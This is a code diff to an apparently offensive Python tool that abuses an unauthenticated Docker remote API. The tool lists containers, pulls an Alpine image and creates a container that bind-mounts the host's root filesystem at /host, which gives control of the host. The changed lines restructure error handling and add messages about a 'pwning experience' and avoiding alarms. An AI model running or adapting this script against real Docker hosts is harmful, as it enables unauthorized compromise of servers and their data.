@@ -15,12 +15,10 @@ def create(target, port, image):
         'Content-Type': 'application/json',
     }
     
-    try:
-        dockerConnection.request('GET', '/containers/json')
-        apiProbeResponse = dockerConnection.getresponse()
-    except Exception as e:
-        print("[-] Unable to connect to API. Error to follow.")
-        print(e)
+    dockerConnection.request('GET', '/containers/json')
+    
+    apiProbeResponse = dockerConnection.getresponse()
+
 
     if apiProbeResponse.status == 200:
         print('\n\n[+] Successfully probed the API. Writing out list of containers just in case there\'s something cool.\n')
@@ -33,15 +31,17 @@ def create(target, port, image):
         dockerConnection.close()
         sys.exit(0)
 
-        print("[+] Downloading specified image to create container...\n")
+    try:
+
+        print("[+] Downloading latest Alpine Image for a lightweight pwning experience.\n")
 
         dockerConnection.request('POST', '/images/create?fromImage=alpine&tag=latest')
         imageStatus = dockerConnection.getresponse()
 
         if imageStatus.status == 200:
-            print("[+] Image is downloading to the host. Sleeping for a bit.\n")
+            print("[+] Alpine image is downloading to the host. Hope we aren't setting off any alarms. Sleeping for a bit.\n")
             dockerConnection.close()
-            timeout = time.time() + 1#60*4
+            timeout = time.time() + 60*4
             while time.time() < timeout:
 	            cursorWait="\|/-\|/-"
 	            for l in cursorWait:
@@ -50,11 +50,11 @@ def create(target, port, image):
 		            sys.stdout.write('\b')
 		            time.sleep(0.2)
         else:
-            print('[-] API refused to download image. Check name. Exiting.')
+            print('[-] API refused to download Alpine Linux. Exiting.')
             dockerConnection.close()
             sys.exit(0)
 
-        print("[+] Alright, creating the container now...\n")
+        print("[+] Alright, creating Alpine Linux Container now...\n")
 
         containerJSON = json.dumps({
             "Hostname": "",
@@ -70,6 +70,7 @@ def create(target, port, image):
             "Image": "alpine",
             "Volumes": {"/host/": {}},
             "HostConfig": {"Binds": ["/:/host"]},
+            "chroot" : "/host",
         })
 
         dockerConnection.request('POST', '/containers/create', containerJSON, headers)
@@ -98,3 +99,6 @@ def create(target, port, image):
             print('[-] Container refused to start. Maybe try again. Insert shrug emoji here.\n')
             dockerConnection.close()
             sys.exit(0)
+
+    except Exception as e:
+        print(e)
